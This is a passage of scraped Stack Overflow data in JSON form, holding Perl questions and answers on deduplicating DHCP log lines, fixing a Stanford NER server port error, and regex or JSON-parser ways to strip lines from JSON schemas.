[{"tags": ["perl", "awk", "sed"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1533161529, "post_id": 51642831, "comment_id": 90250252, "body": "<i>&quot;similar in all aspects except timestamps&quot;</i> Could you be more specific? The lines you showed have many more differences than just the timestamps... I see <code>serverA</code> vs <code>serverB</code>, <code>Service A</code> vs <code>Service B</code>, and the MAC. Maybe you want to invert the logic and only match on specific fields? Also, how should the code decide to keep lines 4 and 6 of your sample input, when your last four lines are so similar?"}, {"owner": {"reputation": 575, "user_id": 3926114, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/e0b5c8500685037356c38c073941b0c9?s=128&d=identicon&r=PG&f=1", "display_name": "user53029", "link": "https://stackoverflow.com/users/3926114/user53029"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533161805, "post_id": 51642831, "comment_id": 90250331, "body": "Server A, Server B and the Service names are all just masked for privacy. But there are only 2 servers and only 2 services. I was thinking we&#39;d need to key off of the IP address, or the circuit or remote ID as these are the fields that will for the most part always be the same."}, {"owner": {"reputation": 575, "user_id": 3926114, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/e0b5c8500685037356c38c073941b0c9?s=128&d=identicon&r=PG&f=1", "display_name": "user53029", "link": "https://stackoverflow.com/users/3926114/user53029"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533162390, "post_id": 51642831, "comment_id": 90250496, "body": "And, to answer your last question, if we key off IP, the code would need to look at all of the lines with the same IP, then keep only the last occurance of that line by timestamp."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1533162524, "post_id": 51642831, "comment_id": 90250521, "body": "Sorry, but <i>&quot;I was thinking X or Y&quot;</i> and <i>&quot;for the most part always&quot;</i> are not clear enough rules for a computer to execute..."}, {"owner": {"reputation": 575, "user_id": 3926114, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/e0b5c8500685037356c38c073941b0c9?s=128&d=identicon&r=PG&f=1", "display_name": "user53029", "link": "https://stackoverflow.com/users/3926114/user53029"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533162688, "post_id": 51642831, "comment_id": 90250569, "body": "OK, easy. Lets assume the IP address is a constant then."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1533163753, "post_id": 51642831, "comment_id": 90250877, "body": "Ok, you haven&#39;t said anything about what order the input file is in or why the timestamps in your example are out of order, but here&#39;s an example that prints only each last line when groups of lines have the same IP (the last line of the file is always printed; lines without IP&#39;s are ignored): <code>perl -nle &#39;&#47;\\bIP\\s*=\\s*(\\S+)\\b&#47;||next;print $a if $.&gt;1 &amp;&amp; $b ne $1;$a=$_;$b=$1;eof&amp;&amp;print&#39; input.txt</code> - if that&#39;s not enough, you&#39;ll have to show a more representative sample of your input data."}, {"owner": {"reputation": 575, "user_id": 3926114, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/e0b5c8500685037356c38c073941b0c9?s=128&d=identicon&r=PG&f=1", "display_name": "user53029", "link": "https://stackoverflow.com/users/3926114/user53029"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533164505, "post_id": 51642831, "comment_id": 90251040, "body": "Yea, that&#39;s my bad. The lines will be ordered from earliest to latest time in the input file."}], "answers": [{"tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": true, "score": 3, "last_activity_date": 1533189010, "last_edit_date": 1533189010, "creation_date": 1533188611, "answer_id": 51646280, "question_id": 51642831, "link": "https://stackoverflow.com/questions/51642831/awk-remove-all-but-last-occurance-of-log-file-line-based-on-time/51646280#51646280", "title": "AWK - remove all but last occurance of log file line based on time", "body": "<p>As per the discussion in the comments, the input file is actually ordered by timestamps in ascending order, and you want to match on the IP.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ cat input.txt \n Aug  1 16:23:05 serverA dhcpd: Service A OPTION-82 | IP =192.168.1.100 | MAC=70:73:cb:b3:3c:58 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n Aug  1 16:24:55 serverB dhcpd: Service B OPTION-82 | IP =192.168.1.100 | MAC=38:71:de:4b:f2:46 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n Jul 27 16:37:46 serverA dhcpd: Service A OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n Jul 27 16:37:46 serverB dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n Jul 31 13:20:11 serverB dhcpd: Service B OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f \n Jul 31 13:20:11 serverA dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n$ perl -ne '/\\bIP\\s*=\\s*([\\d.]+)\\b/||next;$x{$1}=$_}{print $x{$_} for sort keys %x' input.txt \n Aug  1 16:24:55 serverB dhcpd: Service B OPTION-82 | IP =192.168.1.100 | MAC=38:71:de:4b:f2:46 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n Jul 31 13:20:11 serverB dhcpd: Service B OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f \n Jul 31 13:20:11 serverA dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n</code></pre>\n\n<p>Note: <code>sort keys %x</code> isn't perfect, as it will sort the lines alphabetically. If you need the same order as in the original file, please specify, and as I said in the comments, show a more representative sample of input (and output) data. See also <a href=\"https://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a>.</p>\n"}], "owner": {"reputation": 575, "user_id": 3926114, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/e0b5c8500685037356c38c073941b0c9?s=128&d=identicon&r=PG&f=1", "display_name": "user53029", "link": "https://stackoverflow.com/users/3926114/user53029"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 51646280, "answer_count": 1, "score": 2, "last_activity_date": 1533189010, "creation_date": 1533160798, "question_id": 51642831, "link": "https://stackoverflow.com/questions/51642831/awk-remove-all-but-last-occurance-of-log-file-line-based-on-time", "title": "AWK - remove all but last occurance of log file line based on time", "body": "<p>I have a file that collects option 82 data from our DHCP server. The files contains lines that are similar in all aspects except timestamps, and the server that they came from. I need to remove all \"related\" lines except for the last occurrance of the similar line based on time. </p>\n\n<p>My raw file looks like this:</p>\n\n<pre><code> Aug  1 16:23:05 serverA dhcpd: Service A OPTION-82 | IP =192.168.1.100 | MAC=70:73:cb:b3:3c:58 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n Aug  1 16:24:55 serverB dhcpd: Service B OPTION-82 | IP =192.168.1.100 | MAC=38:71:de:4b:f2:46 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n Jul 27 16:37:46 serverA dhcpd: Service A OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n Jul 31 13:20:11 serverB dhcpd: Service B OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f \n Jul 27 16:37:46 serverB dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n Jul 31 13:20:11 serverA dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n</code></pre>\n\n<p>After text processing I need to achieve this:</p>\n\n<pre><code>  Aug  1 16:24:55 serverB dhcpd: Service B OPTION-82 | IP =192.168.1.100 | MAC=38:71:de:4b:f2:46 | CIRCUIT-ID=0a:00:3e:bb:7d:fe | REMOTE-ID=0a:00:3e:bb:73:4a\n  Jul 31 13:20:11 serverB dhcpd: Service B OPTION-82 | IP =192.168.2.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n  Jul 31 13:20:11 serverA dhcpd: Service A OPTION-82 | IP =192.168.3.100 | MAC=3c:90:66:64:c7:20 | CIRCUIT-ID=0a:00:3e:bb:a2:37 | REMOTE-ID=0a:00:3e:bb:c1:3f\n</code></pre>\n\n<p>Here are a few things I have tried so far, but these seem to remove all instances of certain lines, and the finished file is missing data that we need.</p>\n\n<pre><code> /bin/awk '!_[$9]++' rawfile\n /bin/awk 'NR == FNR {if (z[$9]) y[z[$9]]; z[$9] = FNR; next} !(FNR in y)' rawfile rawfile\n tac rawfile | awk '!seen[$9]++' | tac &gt; finished_file\n</code></pre>\n\n<p>I'm in no way an expert on awk. I've found and tried these by just googling, so any help I could get would be greatly appreciated. And, I'm open to other text processing tools, not just awk. </p>\n"}, {"tags": ["perl", "stanford-nlp"], "answers": [{"comments": [{"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "edited": false, "score": 2, "creation_date": 1533165859, "post_id": 51643095, "comment_id": 90251322, "body": "Examples at <a href=\"https://nlp.stanford.edu/software/CRF-NER.shtml\" rel=\"nofollow noreferrer\">nlp.stanford.edu/software/CRF-NER.shtml</a> do not show a port number at end of command line and <code>java -server</code> does not seem to specifically mandate a port, this is completely up the application. The Java source file has <code>Defaut port is 4465</code> and <code>Usage: {@code java edu.stanford.nlp.ie.NERServer [-loadClassifier fileOrResource|-client] -port portNumber}</code> note the <code>-port</code> :-) I guess the documentation is wrong..."}], "tags": [], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "is_accepted": false, "score": 2, "last_activity_date": 1533165993, "last_edit_date": 1533165993, "creation_date": 1533162614, "answer_id": 51643095, "question_id": 51642707, "link": "https://stackoverflow.com/questions/51642707/how-do-i-resolve-a-connection-refused-error-with-perl-module-for-stanford-natu/51643095#51643095", "title": "How do I resolve a &quot;connection refused&quot; error with Perl module for Stanford Natural Language Processor", "body": "<p>I did a port scan and it turns out the service is running on my machine on port 4465, not port 1234. Either the README.txt file is out of date or the <code>1234</code> at the end of the command in the README.txt file is not a port like I thought.</p>\n"}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 284, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1533165993, "creation_date": 1533160038, "last_edit_date": 1533160616, "question_id": 51642707, "link": "https://stackoverflow.com/questions/51642707/how-do-i-resolve-a-connection-refused-error-with-perl-module-for-stanford-natu", "title": "How do I resolve a &quot;connection refused&quot; error with Perl module for Stanford Natural Language Processor", "body": "<p>I'm kicking the tires of some NLP modules in Perl. I have installed <a href=\"https://metacpan.org/pod/Text::NLP::Stanford::EntityExtract\" rel=\"nofollow noreferrer\">Text::NLP::Stanford::EntityExtract</a> (I had to force install because of an <code>refused connection</code> error, cited below).</p>\n\n<p>I have also downloaded and installed the required Java files and ran the following command:</p>\n\n<p><code>java -server -mx400m -cp stanford-ner.jar edu.stanford.nlp.ie.NERServer -loadClassifier classifiers/english.all.3class.distsim.crf.ser.gz 1234</code></p>\n\n<p>The response back was:</p>\n\n<p><code>Loading classifier from classifiers/english.all.3class.distsim.crf.ser.gz ... done [1.1 sec].</code></p>\n\n<p>so it seemed to work.</p>\n\n<p>However, when I run the code straight from the POD for the module:</p>\n\n<pre><code>#!/usr/bin/env perl -w\nuse strict;\nuse Text::NLP::Stanford::EntityExtract;\nmy $ner = Text::NLP::Stanford::EntityExtract-&gt;new;\nmy $server = $ner-&gt;server;\nmy @txt = (\"Some text\\n\\n\", \"Treated as \\\\n\\\\n delimited paragraphs\");\nmy @tagged_text = $ner-&gt;get_entities(@txt);\nmy $entities = $ner-&gt;entities_list($txt[0]); # rather complicated\n                                             # @AOA based data\n                                             # structure for further\n                                             # processing\n</code></pre>\n\n<p>I get the following error:</p>\n\n<p><code>Connection refused at /Users/me/perl5/perlbrew/perls/perl-5.24.1/lib/site_perl/5.24.4/Text/NLP/Stanford/EntityExtract.pm line 84.</code></p>\n\n<p>Not sure what I can try to resolve this. When I run <code>lsof -n -i:1234 | grep LISTEN</code> I get no response back so it looks like the server is not running.</p>\n"}, {"tags": ["regex", "perl", "ultraedit"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533163353, "post_id": 51639961, "comment_id": 90250759, "body": "Are you using <code>$id</code> and <code>$ref</code> as placeholders for a different string, or are they actually <code>$id</code> and <code>$ref</code>?"}, {"owner": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533227184, "post_id": 51639961, "comment_id": 90280163, "body": "This is a snippet from a JSON Schema and $id is the URI definition while $ref specifies a different JSON file to use at that point in the schema."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533228024, "post_id": 51639961, "comment_id": 90280558, "body": "I&#39;m not talking about the value, but the key. Is it actually the 3 chars <code>$</code>,<code>i</code>,<code>d</code> and the 4 chars <code>$</code>,<code>r</code>,<code>e</code>,<code>f</code>, or are those strings you used to anonymize the actual data"}, {"owner": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533321097, "post_id": 51639961, "comment_id": 90319730, "body": "$ref and $id and JSON Schema keywords."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533327922, "post_id": 51639961, "comment_id": 90322568, "body": "I take that to mean <code>$id</code> and <code>$ref</code> are used, which simplifies the answer."}, {"owner": {"reputation": 38379, "user_id": 3074564, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yo5QG.png?s=128&g=1", "display_name": "Mofi", "link": "https://stackoverflow.com/users/3074564/mofi"}, "edited": false, "score": 0, "creation_date": 1533398729, "post_id": 51639961, "comment_id": 90336648, "body": "Despite the fact that UltraEdit for Windows has built-in a JSON manager for high level editing JSON files since version 24.10 it is of course possible to modify the JSON file by running a Perl regular expression replace all. But your question is unclear. Please edit it and added for the posted input data block what you want as output data block after running the regular expression replace. When you want to find a block, but keep a part of the block, you need a <a href=\"https://www.ultraedit.com/support/tutorials-power-tips/ultraedit/perl-regular-expressions-backreferences.html\" rel=\"nofollow noreferrer\">backreference</a>."}, {"owner": {"reputation": 38379, "user_id": 3074564, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yo5QG.png?s=128&g=1", "display_name": "Mofi", "link": "https://stackoverflow.com/users/3074564/mofi"}, "edited": false, "score": 0, "creation_date": 1533399767, "post_id": 51639961, "comment_id": 90336923, "body": "For example using as search string <code>&quot;PaymentMethod&quot;:.+\\r\\n\\K([\\t ]+)(?:.+\\r\\n){2}[\\t ]+(&quot;\\$ref&quot;:.+?\\r\\n)(?:.+\\r\\n){2}</code> and as replace string <code>\\1\\2</code> could work. Or perhaps easier using as search string <code>(?:^[\\t ]+(?:&quot;\\$id|&quot;items|},|&quot;type&quot;).*\\r\\n| {5}(?=&quot;\\$ref&quot;))</code> and an empty string as replace string."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "edited": false, "score": 0, "creation_date": 1533227286, "post_id": 51640072, "comment_id": 90280217, "body": "I&#39;m including the end of lines because I&#39;m actually removing these lines by replacing them with nulls."}, {"owner": {"reputation": 2784, "user_id": 8413636, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d8c46d1ea221e93d32a1b3d2ee354cae?s=128&d=identicon&r=PG&f=1", "display_name": "zzxyz", "link": "https://stackoverflow.com/users/8413636/zzxyz"}, "reply_to_user": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "edited": false, "score": 0, "creation_date": 1533232438, "post_id": 51640072, "comment_id": 90282670, "body": "@user1459463 - but you want to do that explicitly, not anywhere in your regex.  See: <a href=\"https://regex101.com/r/AdTHuI/3\" rel=\"nofollow noreferrer\">regex101.com/r/AdTHuI/3</a>  UltraEdit probably does not have SingleLine on by default (<code>.</code> matches newline), however you can disable this setting and use <code>[^&quot;]</code> to see that &quot;<code>not &quot;</code>&quot; includes newlines.  Then try <code>.*?</code> and <code>[^&quot;\\n]*</code> and <code>[^&quot;\\n]*?</code> to see how the behavior changes."}], "tags": [], "owner": {"reputation": 2784, "user_id": 8413636, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d8c46d1ea221e93d32a1b3d2ee354cae?s=128&d=identicon&r=PG&f=1", "display_name": "zzxyz", "link": "https://stackoverflow.com/users/8413636/zzxyz"}, "is_accepted": false, "score": 0, "last_activity_date": 1533148952, "last_edit_date": 1533148952, "creation_date": 1533148264, "answer_id": 51640072, "question_id": 51639961, "link": "https://stackoverflow.com/questions/51639961/using-regex-select-line-based-on-positive-criteria-but-exclude-certain-lines-bas/51640072#51640072", "title": "Using RegEx select line based on positive criteria but exclude certain lines based on negative", "body": "<p>If you don't want <code>$ref</code> after the initial quotes:</p>\n\n<pre><code>^.*\\\"(?!\\$ref).*\\\"\\: \\\".*$\\r\\n \n</code></pre>\n\n<p>see it here: <a href=\"https://regex101.com/r/yxTwck/1\" rel=\"nofollow noreferrer\">https://regex101.com/r/yxTwck/1</a></p>\n\n<p>or to exclude based on <code>.json\"</code> at the end of the line:</p>\n\n<pre><code>^.*\\\".*\\\"\\: \\\".*(?&lt;!\\.json\")$\\r\\n\n</code></pre>\n\n<p>Also note that you are using greedy quantifiers (<code>.*</code> vs. <code>.*?</code>).  If your idea is to have the first <code>.*</code> stop at the first <code>\"</code>, you should probably use <code>[^\\n\"]*</code> which will prevent line feeds or <code>\"</code>s from being consumed.  Your regex matches <code>\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"type\": \"array\"</code>, for example.</p>\n"}, {"comments": [{"owner": {"reputation": 2784, "user_id": 8413636, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d8c46d1ea221e93d32a1b3d2ee354cae?s=128&d=identicon&r=PG&f=1", "display_name": "zzxyz", "link": "https://stackoverflow.com/users/8413636/zzxyz"}, "edited": false, "score": 0, "creation_date": 1533148581, "post_id": 51640090, "comment_id": 90244749, "body": "I think he probably meant to tag PCRE rather than perl itself, although I could be mistaken."}, {"owner": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "edited": false, "score": 0, "creation_date": 1533227225, "post_id": 51640090, "comment_id": 90280186, "body": "I&#39;m using the perl setting in UltraEdit."}], "tags": [], "owner": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "is_accepted": false, "score": 0, "last_activity_date": 1533148316, "creation_date": 1533148316, "answer_id": 51640090, "question_id": 51639961, "link": "https://stackoverflow.com/questions/51639961/using-regex-select-line-based-on-positive-criteria-but-exclude-certain-lines-bas/51640090#51640090", "title": "Using RegEx select line based on positive criteria but exclude certain lines based on negative", "body": "<p>Using a JSON module to manipulate the data directly would be a more robust solution, but a quck and dirty way to edit the JSON file would be to run this on the command line.</p>\n\n<p>Again, this is not a good way to manipulate JSON, but it may be suitable for your ad hoc case.</p>\n\n<pre><code>perl -ne 'print unless /\"\\$ref:\"/' file.json &gt; new_file.json\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1533348546, "last_edit_date": 1533348546, "creation_date": 1533163525, "answer_id": 51643229, "question_id": 51639961, "link": "https://stackoverflow.com/questions/51639961/using-regex-select-line-based-on-positive-criteria-but-exclude-certain-lines-bas/51643229#51643229", "title": "Using RegEx select line based on positive criteria but exclude certain lines based on negative", "body": "<p>Don't write your own broken parser; use an existing one.</p>\n\n<pre><code>use Cpanel::JSON::XS qw( decode_json );\n\nmy $json_utf8      = '...';\nmy $data           = decode_json($json_utf8);\nmy $payment_method = $data-&gt;{PaymentMethod};\nmy $id             = $payment_method-&gt;{'$id'};\nmy $item           = $payment_method-&gt;{items}{'$ref'};\nmy $type           = $payment_method-&gt;{type};\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 1459463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f902dee2cc02ed046ae50b9248763d8?s=128&d=identicon&r=PG", "display_name": "user1459463", "link": "https://stackoverflow.com/users/1459463/user1459463"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1533348546, "creation_date": 1533147830, "last_edit_date": 1533321483, "question_id": 51639961, "link": "https://stackoverflow.com/questions/51639961/using-regex-select-line-based-on-positive-criteria-but-exclude-certain-lines-bas", "title": "Using RegEx select line based on positive criteria but exclude certain lines based on negative", "body": "<p>I apologize if there is an answer for this somewhere, but my search skills have failed me if there is.</p>\n\n<p>I'm using UltraEdit and there are lines I need to remove from some JSON schemas to make comparing them easier.</p>\n\n<p>So given the following:</p>\n\n<pre><code>\"PaymentMethod\": {\n               \"$id\": \"/properties/PaymentMethod\",\n                \"items\": {\n                    \"$ref\": \"PaymentMethod.json\"\n                },\n                \"type\": \"array\"\n            }\n</code></pre>\n\n<p>Using this RegEx: </p>\n\n<pre><code>^.*\\\".*\\\"\\: \\\".*$\\r\\n\n</code></pre>\n\n<p>Selects these lines:</p>\n\n<pre><code>\"$id\": \"/properties/PaymentMethod\",\n\"$ref\": \"PaymentMethod.json\"\n\"type\": \"array\"\n</code></pre>\n\n<p>What I need to do is skip the $ref line.</p>\n\n<p>I've tried to get negative lookaround to work using (?!json) in various ways with the selection criteria and have failed miserably.</p>\n\n<p>The purpose of this is to delete the selected lines.</p>\n\n<p>Thanks for any help.</p>\n\n<p>Update:\nTo clarify, there are lines I want to delete that match the criteria my Regex finds, but I do not want to delete the $ref line.\nSo I was hoping to find a relatively easy way to do this using straight up perl regex within UltraEdit.</p>\n\n<p>I've created a workaround with a Python script so I can get my work done, but it would still be interesting to find out if there is a way to do this. :)</p>\n"}, {"tags": ["perl", "skip", "log-rotation"], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533138884, "post_id": 51637545, "comment_id": 90239555, "body": "I&#39;m being particularly dense. Can you explain the question for me please Dave?"}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533139033, "post_id": 51637545, "comment_id": 90239636, "body": "@Dave Cross You&#39;re absolutely right, I had not thought about it. Immediately adopt your penultimate solution, it is really clean and smart"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", 